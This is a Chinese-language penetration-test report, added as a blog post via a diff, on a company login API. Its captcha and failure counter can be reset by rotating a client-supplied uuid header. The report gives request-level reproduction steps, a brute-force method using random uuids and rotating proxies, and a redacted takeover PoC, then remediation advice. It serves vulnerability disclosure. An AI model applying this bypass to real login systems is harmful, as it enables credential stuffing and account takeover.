@@ -1,0 +1,117 @@
+---
+title: 某企业の漏洞-弱口令爆破报告
+date: 2026-10-05 16:30:00
+categories:
+  - [技术, 安全]
+tags: [安全, 渗透测试, 弱口令, 验证码绕过]
+---
+
+## 一、漏洞描述
+
+### 1. 影响资产：
+
+**影响资产**：（统一登录接口）
+
+**发现**：（验证码绕过机理）、（账号枚举）、（账号接管实证）
+
+**严重级别**：高危（High）
+
+### 2. 详情：
+
+某企业的登录页面
+
+登录接口 POST /openapi/account/login/by 的"图形验证码 / 失败计数"防爆破阈值**绑定在客户端完全可控的 uuid 请求头**上，而非服务端 Session 或来源 IP。攻击者只需为每次请求随机更换 uuid 头，失败计数就永远无法累计，验证码永不触发，从而可对任意账号实施**无限次在线口令爆破**。
+
+该缺陷与已确认的**账号枚举**（/openapi/account/exist 无需登录/验证码即可判断账号是否存在）组合后，形成完整攻击链：**枚举有效账号 → 绕过防爆破在线撞库 → 取得有效会话令牌 → 账号接管**。测试中已用可枚举的真实账号配合字典（全程随机 uuid）在多次尝试下 **0 次验证码、0 次 WAF 拦截**，实际撞开真实账号 \*\*\*\*\*\* / \*\*\*\*\*\*，并取得服务端签发的有效 JWT 会话令牌，坐实端到端账号接管。
+
+**危害**：任意注册用户的账号可被接管（读取/篡改其账户资料、漏洞报告、资金/团队等业务数据）；结合账号枚举可批量撞库，影响面为全站用户。
+
+## 二、复现步骤
+
+### 步骤 1
+
+验证存在的问题（确认验证码阈值绑定 uuid）：
+
+```bash
+# 头：Content-Type: application/json  X-Requested-With: XMLHttpRequest  X-Client-Type: web  uuid: <固定值>
+POST <https://******/openapi/account/login/by>
+# body：
+{"login_by":"username","username":"admin","password":"<base64(Abcd1234)>"}
+```
+
+| 尝试次数(同 uuid) | 响应 |
+| --- | --- |
+| #4 | {"code":400,"data":{"captcha":false},"msg":"账号或密码错误, 请校验后重新输入"} |
+| #5 | {"code":400,"data":{"captcha":true},"msg":"账号或密码错误, 请校验后重新输入"} ← 该 uuid 被锁定 |
+| #6 | {"code":400,"data":{"captcha":true},"msg":"验证码错误"} ← 强制验证码 |
+
+### 步骤 2
+
+改用全新随机 uuid （更换新 uuid 使计数复位）：
+
+```bash
+new-uuid #1 → {"code":400,"data":{"captcha":false},"msg":"账号或密码错误, 请校验后重新输入"}
+```
+
+验证码标志立即复位为 false，说明失败计数以客户端 uuid 为键，可被任意轮换绕过。
+
+### 步骤 3
+
+字典爆破（每次随机 uuid + 轮换出口代理）
+
+对账号枚举得到的 真实账号 + 密码字典 逐一口令尝试，每次请求随机更换 uuid 头。
+
+实测多次尝试 0 验证码需要、0 WAF 拦截，命中 \*\*\*\*\*\* / \*\*\*\*\*\* 。
+
+### 步骤 4
+
+账号接管 PoC ：
+
+```bash
+POST /openapi/account/login/by
+Content-Type: application/json
+X-Requested-With: XMLHttpRequest
+X-Client-Type: web
+uuid: <随机>
+
+{"login_by":"username","username":"******","password":"<base64('******')>"}
+```
+
+命中响应（HTTP 200）：
+
+```json
+{"code":200,"data":{"uid":18,"username":"******","type":1,
+  "init_password":false,"mfa_secret":false,
+  "token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.******.******",
+  "expired_at":1792314331},"msg":"success"}
+```
+
+### 步骤 5
+
+验证会话有效（访问登录态接口）
+
+```bash
+# 携带 Authorization: Bearer <token>
+POST /openapi/account/logout   → {"code":200,"data":{"url":"<https://******"},"msg":"success"}
+POST /openapi/account/mfa/verify → {"code":400,"data":{"code":["code必填"]}}   # 已过鉴权层，仅缺业务参数
+```
+
+JWT payload 解码：{"uid":18,"username":"\*\*\*\*\*\*","type":1,"sub":"\*\*\*\*\*\*"} 
+
+—— 端到端账号接管成立。
+
+## 三、修复建议
+
+**将失败计数与验证码强制逻辑绑定到服务端维度**：以服务端 Session / 账号维度记录失败次数，绝不信任 uuid 等客户端可控头作为计数键；如需保留设备维度，应与签名后的服务端票据绑定，不能仅凭客户端自报。
+
+**登录失败计数账户级 + IP 级双重限制**：达到阈值（如 5 次）后强制图形验证码或临时锁定；连续失败触发指数退避、账号锁定与告警。
+
+**对 uuid 头做完整性校验**：若必须使用，应由服务端签发并签名（如 HMAC），服务端校验其真实性与新鲜度，禁止客户端任意指定。
+
+**弱口令策略**：强制密码复杂度校验（长度、字符类型、常见弱口令黑名单），禁用 888888、123456 等；对新注册/改密启用弱口令检测。
+
+**关闭未授权账号枚举**：/openapi/account/exist 增加图形验证码/频率限制，并统一"存在/不存在"的响应时延与文案，避免可批量区分。
+
+**对已泄露账号处置**：立即通知 账户 等受影响账号改密，并使其当前所有会话失效。
+
+**增强 WAF**：对本接口补充基于账号维度的频率限制规则，而非仅依赖 IP 粗粒度限速。
